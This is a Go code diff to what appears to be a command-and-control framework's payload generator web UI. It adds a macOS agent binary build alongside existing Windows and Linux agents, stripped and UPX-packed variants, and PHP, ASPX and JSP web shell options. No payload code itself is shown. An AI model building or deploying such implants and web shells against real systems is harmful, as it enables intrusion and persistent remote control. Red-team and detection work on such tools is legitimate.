@@ -42,6 +42,7 @@ func (w *WebUI) handlePayloadTypes(rw http.ResponseWriter, r *http.Request) {
 		{"id": "exe-garble", "name": "Windows EXE (Stripped+UPX)", "icon": "🪟", "category": "Agent Binary", "desc": "Stripped symbols + UPX compressed (~2.6MB, 60% smaller)"},
 		{"id": "elf", "name": "Linux ELF", "icon": "🐧", "category": "Agent Binary", "desc": "Linux executable agent (amd64)"},
 		{"id": "elf-garble", "name": "Linux ELF (Stripped+UPX)", "icon": "🐧", "category": "Agent Binary", "desc": "Stripped symbols + UPX compressed (~2.4MB, 60% smaller)"},
+		{"id": "darwin", "name": "macOS Mach-O", "icon": "🍎", "category": "Agent Binary", "desc": "macOS executable agent (darwin/amd64)"},
 		{"id": "aspx", "name": "ASPX Web Shell", "icon": "🌐", "category": "Web Shell", "desc": "ASP.NET web shell for IIS servers"},
 		{"id": "php", "name": "PHP Web Shell", "icon": "🌐", "category": "Web Shell", "desc": "PHP web shell with 5 exec fallbacks"},
 		{"id": "jsp", "name": "JSP Web Shell", "icon": "🌐", "category": "Web Shell", "desc": "Java web shell for Tomcat servers"},
@@ -106,7 +107,7 @@ func (w *WebUI) handlePayloadGenerate(rw http.ResponseWriter, r *http.Request) {
 	rw.Header().Set("Content-Type", "application/json")
 
 	switch req.Type {
-	case "exe", "elf", "exe-garble", "elf-garble", "svc-exe", "dll":
+	case "exe", "elf", "exe-garble", "elf-garble", "svc-exe", "dll", "darwin":
 		resp := w.buildAgentBinary(req)
 		json.NewEncoder(rw).Encode(resp)
 
@@ -201,6 +202,8 @@ func (w *WebUI) buildAgentBinary(req PayloadRequest) PayloadResponse {
 		obfuscate = true
 	case "elf-garble":
 		obfuscate = true
+	case "darwin":
+		targetOS = "darwin"
 	case "svc-exe":
 		targetOS = "windows"
 		buildMode = "service"
@@ -336,7 +339,11 @@ func (w *WebUI) buildAgentBinary(req PayloadRequest) PayloadResponse {
 	}
 
 	if !built {
-		buildCmd := exec.Command("go", "build", "-ldflags", ldflags, "-o", outputPath, "./cmd/agent")
+		agentPkg := "./cmd/agent"
+		if targetOS == "darwin" {
+			agentPkg = "./cmd/agent-darwin"
+		}
+		buildCmd := exec.Command("go", "build", "-ldflags", ldflags, "-o", outputPath, agentPkg)
 		buildCmd.Dir = projectRoot
 		buildCmd.Env = env
 		if out, err := buildCmd.CombinedOutput(); err != nil {
